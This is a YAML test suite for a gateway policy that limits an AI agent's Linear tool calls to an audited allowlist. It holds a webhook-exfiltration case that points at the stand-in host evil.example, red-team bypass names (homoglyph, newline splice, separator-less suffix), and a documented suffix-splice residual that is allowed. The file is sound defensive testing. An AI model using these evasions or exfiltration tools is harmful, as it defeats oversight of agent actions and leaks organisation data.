@@ -1,0 +1,351 @@
+# ---------------------------------------------------------------------------
+# Positive cases — cover both allow branches and every matching form:
+#   * branch 1: whole name IS an allowlisted form (bare official name)
+#   * branch 2: name ends in separator + allowlisted form (prefixed spellings)
+#   * the underscore-stripped form that spans the tacticlaunch camelCase spelling
+#   * case-insensitivity via lower()
+# ---------------------------------------------------------------------------
+- description: Bare official snake_case name, no gateway prefix (create_issue). Branch 1 exact match. Allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: create_issue
+      uri: null
+    payload:
+      name: create_issue
+      args:
+        title: Fix login bug
+        teamId: t-123
+  output:
+    expectedResult: allow
+
+- description: Gateway server-prefixed official read (linear-mcp-list_issues). Branch 2, '-' separator. Allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: linear-mcp-list_issues
+      uri: null
+    payload:
+      name: linear-mcp-list_issues
+      args:
+        teamId: t-123
+  output:
+    expectedResult: allow
+
+- description: Gateway-prefixed distinct read (linear-mcp-list_my_issues). Branch 2, '-' separator. Allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: linear-mcp-list_my_issues
+      uri: null
+    payload:
+      name: linear-mcp-list_my_issues
+      args: {}
+  output:
+    expectedResult: allow
+
+- description: jerhadf-style linear_ + snake_case spelling (linear_create_issue). Branch 2, '_' separator. Allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: linear_create_issue
+      uri: null
+    payload:
+      name: linear_create_issue
+      args:
+        title: Fix login bug
+  output:
+    expectedResult: allow
+
+- description: tacticlaunch camelCase spelling behind gateway prefix (linear-mcp-linear_createIssue). Matches create_issue on its underscore-stripped form (createissue). Allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: linear-mcp-linear_createIssue
+      uri: null
+    payload:
+      name: linear-mcp-linear_createIssue
+      args:
+        title: Fix login bug
+        teamId: t-123
+  output:
+    expectedResult: allow
+
+- description: Case-insensitivity — uppercase bare official name (CREATE_ISSUE) matches via lower(). Branch 1. Allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: CREATE_ISSUE
+      uri: null
+    payload:
+      name: CREATE_ISSUE
+      args:
+        title: Fix login bug
+  output:
+    expectedResult: allow
+
+# ---------------------------------------------------------------------------
+# Negative cases — default-deny fires for everything off the allowlist,
+# including the community sidecar's dangerous tools, unverified Feb-2026
+# names, and the red-team bypass attempts.
+# ---------------------------------------------------------------------------
+- description: Dangerous tacticlaunch tool — standing webhook exfiltration (linear_createWebhook). Not on the allowlist. Deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: linear-mcp-linear_createWebhook
+      uri: null
+    payload:
+      name: linear-mcp-linear_createWebhook
+      args:
+        url: https://evil.example/collect
+        resourceTypes:
+          - Issue
+  output:
+    expectedResult: deny
+    expectedReason: "This Linear tool is not on the audited allowlist, so the gateway denies it by default and surfaces the call as tool drift. The allowlist pins the verified official Linear tool names (list_issues, get_issue, create_issue, update_issue, create_comment, …); anything else — tacticlaunch community tools such as linear_createWebhook (standing exfiltration), linear_logoutAllSessions (account DoS), or linear_getOrganizationAuditEvents (org surveillance); delete/archive tools the official server does not have; unverified Feb-2026 initiative/milestone/project-update tools; or a renamed/newly added upstream tool — is denied until it is re-audited. If this tool is legitimate, ask a gateway admin to confirm its exact name with a live tools/list and add it to the allowlist for this Linear pipeline."
+
+- description: Dangerous tacticlaunch tool — account-level session DoS (linear_logoutAllSessions). Deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: linear-mcp-linear_logoutAllSessions
+      uri: null
+    payload:
+      name: linear-mcp-linear_logoutAllSessions
+      args: {}
+  output:
+    expectedResult: deny
+    expectedReason: "This Linear tool is not on the audited allowlist, so the gateway denies it by default and surfaces the call as tool drift. The allowlist pins the verified official Linear tool names (list_issues, get_issue, create_issue, update_issue, create_comment, …); anything else — tacticlaunch community tools such as linear_createWebhook (standing exfiltration), linear_logoutAllSessions (account DoS), or linear_getOrganizationAuditEvents (org surveillance); delete/archive tools the official server does not have; unverified Feb-2026 initiative/milestone/project-update tools; or a renamed/newly added upstream tool — is denied until it is re-audited. If this tool is legitimate, ask a gateway admin to confirm its exact name with a live tools/list and add it to the allowlist for this Linear pipeline."
+
+- description: Dangerous tacticlaunch tool — org-wide surveillance (linear_getOrganizationAuditEvents). Deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: linear-mcp-linear_getOrganizationAuditEvents
+      uri: null
+    payload:
+      name: linear-mcp-linear_getOrganizationAuditEvents
+      args: {}
+  output:
+    expectedResult: deny
+    expectedReason: "This Linear tool is not on the audited allowlist, so the gateway denies it by default and surfaces the call as tool drift. The allowlist pins the verified official Linear tool names (list_issues, get_issue, create_issue, update_issue, create_comment, …); anything else — tacticlaunch community tools such as linear_createWebhook (standing exfiltration), linear_logoutAllSessions (account DoS), or linear_getOrganizationAuditEvents (org surveillance); delete/archive tools the official server does not have; unverified Feb-2026 initiative/milestone/project-update tools; or a renamed/newly added upstream tool — is denied until it is re-audited. If this tool is legitimate, ask a gateway admin to confirm its exact name with a live tools/list and add it to the allowlist for this Linear pipeline."
+
+- description: Destructive community tool the official server does not have (linear_archiveIssue). Deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: linear-mcp-linear_archiveIssue
+      uri: null
+    payload:
+      name: linear-mcp-linear_archiveIssue
+      args:
+        issueId: iss-1
+  output:
+    expectedResult: deny
+    expectedReason: "This Linear tool is not on the audited allowlist, so the gateway denies it by default and surfaces the call as tool drift. The allowlist pins the verified official Linear tool names (list_issues, get_issue, create_issue, update_issue, create_comment, …); anything else — tacticlaunch community tools such as linear_createWebhook (standing exfiltration), linear_logoutAllSessions (account DoS), or linear_getOrganizationAuditEvents (org surveillance); delete/archive tools the official server does not have; unverified Feb-2026 initiative/milestone/project-update tools; or a renamed/newly added upstream tool — is denied until it is re-audited. If this tool is legitimate, ask a gateway admin to confirm its exact name with a live tools/list and add it to the allowlist for this Linear pipeline."
+
+- description: Unverified Feb-2026 official tool name guessed by aggregators (create_initiative). Not pinned — denied until an operator confirms it via tools/list. Deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: linear-mcp-create_initiative
+      uri: null
+    payload:
+      name: linear-mcp-create_initiative
+      args:
+        name: Q3 launch
+  output:
+    expectedResult: deny
+    expectedReason: "This Linear tool is not on the audited allowlist, so the gateway denies it by default and surfaces the call as tool drift. The allowlist pins the verified official Linear tool names (list_issues, get_issue, create_issue, update_issue, create_comment, …); anything else — tacticlaunch community tools such as linear_createWebhook (standing exfiltration), linear_logoutAllSessions (account DoS), or linear_getOrganizationAuditEvents (org surveillance); delete/archive tools the official server does not have; unverified Feb-2026 initiative/milestone/project-update tools; or a renamed/newly added upstream tool — is denied until it is re-audited. If this tool is legitimate, ask a gateway admin to confirm its exact name with a live tools/list and add it to the allowlist for this Linear pipeline."
+
+- description: Red-team — crafted name ending in an allowlisted string with NO separator boundary (superCreateIssue). The separator-boundary requirement in branch 2 blocks this. Deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: superCreateIssue
+      uri: null
+    payload:
+      name: superCreateIssue
+      args: {}
+  output:
+    expectedResult: deny
+    expectedReason: "This Linear tool is not on the audited allowlist, so the gateway denies it by default and surfaces the call as tool drift. The allowlist pins the verified official Linear tool names (list_issues, get_issue, create_issue, update_issue, create_comment, …); anything else — tacticlaunch community tools such as linear_createWebhook (standing exfiltration), linear_logoutAllSessions (account DoS), or linear_getOrganizationAuditEvents (org surveillance); delete/archive tools the official server does not have; unverified Feb-2026 initiative/milestone/project-update tools; or a renamed/newly added upstream tool — is denied until it is re-audited. If this tool is legitimate, ask a gateway admin to confirm its exact name with a live tools/list and add it to the allowlist for this Linear pipeline."
+
+- description: Red-team — non-ASCII homoglyph in the tool name (Cyrillic 'е' in list_issuе). The raw-name ASCII guard runs before lower() and denies it. Deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: linear-mcp-list_issuе
+      uri: null
+    payload:
+      name: linear-mcp-list_issuе
+      args: {}
+  output:
+    expectedResult: deny
+    expectedReason: "This Linear tool is not on the audited allowlist, so the gateway denies it by default and surfaces the call as tool drift. The allowlist pins the verified official Linear tool names (list_issues, get_issue, create_issue, update_issue, create_comment, …); anything else — tacticlaunch community tools such as linear_createWebhook (standing exfiltration), linear_logoutAllSessions (account DoS), or linear_getOrganizationAuditEvents (org surveillance); delete/archive tools the official server does not have; unverified Feb-2026 initiative/milestone/project-update tools; or a renamed/newly added upstream tool — is denied until it is re-audited. If this tool is legitimate, ask a gateway admin to confirm its exact name with a live tools/list and add it to the allowlist for this Linear pipeline."
+
+- description: Fail-closed on missing tool name (resource.name absent). raw name resolves to "" and matches nothing. Deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      uri: null
+    payload:
+      args: {}
+  output:
+    expectedResult: deny
+    expectedReason: "This Linear tool is not on the audited allowlist, so the gateway denies it by default and surfaces the call as tool drift. The allowlist pins the verified official Linear tool names (list_issues, get_issue, create_issue, update_issue, create_comment, …); anything else — tacticlaunch community tools such as linear_createWebhook (standing exfiltration), linear_logoutAllSessions (account DoS), or linear_getOrganizationAuditEvents (org surveillance); delete/archive tools the official server does not have; unverified Feb-2026 initiative/milestone/project-update tools; or a renamed/newly added upstream tool — is denied until it is re-audited. If this tool is legitimate, ask a gateway admin to confirm its exact name with a live tools/list and add it to the allowlist for this Linear pipeline."
+
+- description: Fail-closed on a non-string tool name (number). tool_name is coerced to "" instead of raising a lower() type error, yielding a clean reasoned deny. Deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: 12345
+      uri: null
+    payload:
+      name: 12345
+      args: {}
+  output:
+    expectedResult: deny
+    expectedReason: "This Linear tool is not on the audited allowlist, so the gateway denies it by default and surfaces the call as tool drift. The allowlist pins the verified official Linear tool names (list_issues, get_issue, create_issue, update_issue, create_comment, …); anything else — tacticlaunch community tools such as linear_createWebhook (standing exfiltration), linear_logoutAllSessions (account DoS), or linear_getOrganizationAuditEvents (org surveillance); delete/archive tools the official server does not have; unverified Feb-2026 initiative/milestone/project-update tools; or a renamed/newly added upstream tool — is denied until it is re-audited. If this tool is legitimate, ask a gateway admin to confirm its exact name with a live tools/list and add it to the allowlist for this Linear pipeline."
+
+# ---------------------------------------------------------------------------
+# Red-team — regex/encoding edges (standards §10: "newlines, very long
+# strings", encoding tricks). The raw-name ASCII guard's regex is anchored
+# ^...$; in OPA/Go RE2 `$` matches end-of-text (like \z), NOT before a trailing
+# newline, and `\n`/space are outside [A-Za-z0-9._-]. So any embedded/trailing
+# newline or whitespace, and any oversized junk name, fails the guard and is
+# denied. These lock that fail-closed behavior so a future edit that added the
+# (?m) flag or dropped an anchor — silently opening a newline-splice bypass —
+# becomes a visible test diff.
+# ---------------------------------------------------------------------------
+- description: Red-team — embedded newline splicing a dangerous tool after an allowlisted form (create_issue\nlinear_createWebhook). Newline is outside the ASCII class; anchored guard denies. Deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: "create_issue\nlinear_createWebhook"
+      uri: null
+    payload:
+      name: "create_issue\nlinear_createWebhook"
+      args: {}
+  output:
+    expectedResult: deny
+    expectedReason: "This Linear tool is not on the audited allowlist, so the gateway denies it by default and surfaces the call as tool drift. The allowlist pins the verified official Linear tool names (list_issues, get_issue, create_issue, update_issue, create_comment, …); anything else — tacticlaunch community tools such as linear_createWebhook (standing exfiltration), linear_logoutAllSessions (account DoS), or linear_getOrganizationAuditEvents (org surveillance); delete/archive tools the official server does not have; unverified Feb-2026 initiative/milestone/project-update tools; or a renamed/newly added upstream tool — is denied until it is re-audited. If this tool is legitimate, ask a gateway admin to confirm its exact name with a live tools/list and add it to the allowlist for this Linear pipeline."
+
+- description: Red-team — trailing-newline appended to an allowlisted name (create_issue\n). Go RE2 `$` is \z, not \Z, so the trailing newline is not tolerated; denied. Deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: "create_issue\n"
+      uri: null
+    payload:
+      name: "create_issue\n"
+      args: {}
+  output:
+    expectedResult: deny
+    expectedReason: "This Linear tool is not on the audited allowlist, so the gateway denies it by default and surfaces the call as tool drift. The allowlist pins the verified official Linear tool names (list_issues, get_issue, create_issue, update_issue, create_comment, …); anything else — tacticlaunch community tools such as linear_createWebhook (standing exfiltration), linear_logoutAllSessions (account DoS), or linear_getOrganizationAuditEvents (org surveillance); delete/archive tools the official server does not have; unverified Feb-2026 initiative/milestone/project-update tools; or a renamed/newly added upstream tool — is denied until it is re-audited. If this tool is legitimate, ask a gateway admin to confirm its exact name with a live tools/list and add it to the allowlist for this Linear pipeline."
+
+- description: Red-team — trailing space on an allowlisted name (create_issue<space>). Space is outside the ASCII class; anchored guard denies. Deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: "create_issue "
+      uri: null
+    payload:
+      name: "create_issue "
+      args: {}
+  output:
+    expectedResult: deny
+    expectedReason: "This Linear tool is not on the audited allowlist, so the gateway denies it by default and surfaces the call as tool drift. The allowlist pins the verified official Linear tool names (list_issues, get_issue, create_issue, update_issue, create_comment, …); anything else — tacticlaunch community tools such as linear_createWebhook (standing exfiltration), linear_logoutAllSessions (account DoS), or linear_getOrganizationAuditEvents (org surveillance); delete/archive tools the official server does not have; unverified Feb-2026 initiative/milestone/project-update tools; or a renamed/newly added upstream tool — is denied until it is re-audited. If this tool is legitimate, ask a gateway admin to confirm its exact name with a live tools/list and add it to the allowlist for this Linear pipeline."
+
+- description: Red-team — oversized junk tool name that is not on the allowlist. Anchored ASCII match + endswith are linear (RE2, no backtracking); fails closed with no perf issue. Deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx_not_an_allowlisted_tool
+      uri: null
+    payload:
+      name: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx_not_an_allowlisted_tool
+      args: {}
+  output:
+    expectedResult: deny
+    expectedReason: "This Linear tool is not on the audited allowlist, so the gateway denies it by default and surfaces the call as tool drift. The allowlist pins the verified official Linear tool names (list_issues, get_issue, create_issue, update_issue, create_comment, …); anything else — tacticlaunch community tools such as linear_createWebhook (standing exfiltration), linear_logoutAllSessions (account DoS), or linear_getOrganizationAuditEvents (org surveillance); delete/archive tools the official server does not have; unverified Feb-2026 initiative/milestone/project-update tools; or a renamed/newly added upstream tool — is denied until it is re-audited. If this tool is legitimate, ask a gateway admin to confirm its exact name with a live tools/list and add it to the allowlist for this Linear pipeline."
+
+# ---------------------------------------------------------------------------
+# Documented residual (Known limitations): suffix matching admits a hostile
+# name that splices an allowlisted form after a real separator. This locks in
+# the CURRENT behavior so a future change to it is a visible test diff — it is
+# NOT an endorsement. Audit the actual tool list your server exposes.
+# ---------------------------------------------------------------------------
+- description: Documented residual — a name that ends in a separator + allowlisted form (evil-server-create_issue) is admitted by suffix matching. Locks documented behavior. Allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: evil-server-create_issue
+      uri: null
+    payload:
+      name: evil-server-create_issue
+      args:
+        title: spliced
+  output:
+    expectedResult: allow
